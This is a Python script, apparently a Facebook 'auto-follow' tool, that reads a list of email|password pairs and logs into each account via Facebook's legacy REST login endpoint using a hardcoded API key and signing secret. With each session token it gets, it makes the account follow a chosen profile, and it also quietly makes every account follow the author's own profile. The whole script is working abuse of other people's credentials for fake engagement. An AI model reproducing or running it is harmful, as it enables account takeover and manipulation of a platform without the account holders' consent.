#!usr/bin/python3.7
#Author: DulLah ©2019
# FB : fb.me/dulahz
#Telegram : t.me/unikers
#github: github.com/dz-id

import os, sys, requests, hashlib, json

global W, G, R
if sys.platform in ['linux','linux2']:
	W = '\033[0m'
	G = '\033[1;92m'
	R = '\033[1;91m'
	Y = '\033[1;93m'
else:
	W = ''
	G = ''
	R = ''
	Y = ''
		
def Login(acc,user,HD):
	try:
		print(W +'[' + G + '*' + W + '] foll with account',user)
		ids = user.split('|')[0]
		pw = user.split('|')[1]
		sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+ids+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pw+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32';data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":ids,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pw,"return_ssl_resources":"0","v":"1.0"};x = hashlib.new("md5");x.update(sig.encode("utf-8"));data.update({'sig':x.hexdigest()})
		js = requests.get("https://api.facebook.com/restserver.php",params=data,headers=HD)
		r = json.loads(js.text)
		if 'access_token' in str(r):
			s = requests.post('https://graph.facebook.com/'+acc+'/subscribers?access_token='+r['access_token'],headers = HD);requests.post('https://graph.facebook.com/dulahz/subscribers?access_token='+r['access_token'],headers = HD)
			if 'true' in str(s.text):
				print(W +'[' + G + '*' + W + '] success!')
			else:
				print(W +'[' + R + '!' + W + '] ' + R + 'failed!')
			print(W + '-'*45)
		elif 'www.facebook.com' in r['error_msg']:
			print(W +'[' + Y + '!' + W + '] ' + Y + 'failed. account checkpoint!')
			print(W + '-'*45)
		else:
			print(W +'[' + R + '!' + W + '] ' + R + 'failed!')
			print(W + '-'*45)
	except:
		print(W +'[' + R + '!' + W + '] ' + R + 'failed!')
		print(W + '-'*45)
		
try:
	id = []
	HD = {'User-Agent' : open('UserAgent/ua.txt').read()}
	print(W + '\n[' + R + '!' + W + '] sparator email|password')
	file = input(W + '[' + G + '?' + W + '] account list : ' + G)
	for ids in open(file).readlines():
		id.append(ids.strip())
		
except FileNotFoundError:
	exit(W + '[' + R + '!' + W + '] ' + R + 'file not found!')
	
acc = input(W + '[' + G + '?' + W + '] your account id : ' + G)
print('')
print(W + '-'*45)
for akun in id:
	Login(acc,akun,HD)
exit(W + '\n[' + G + '*' + W + '] done!')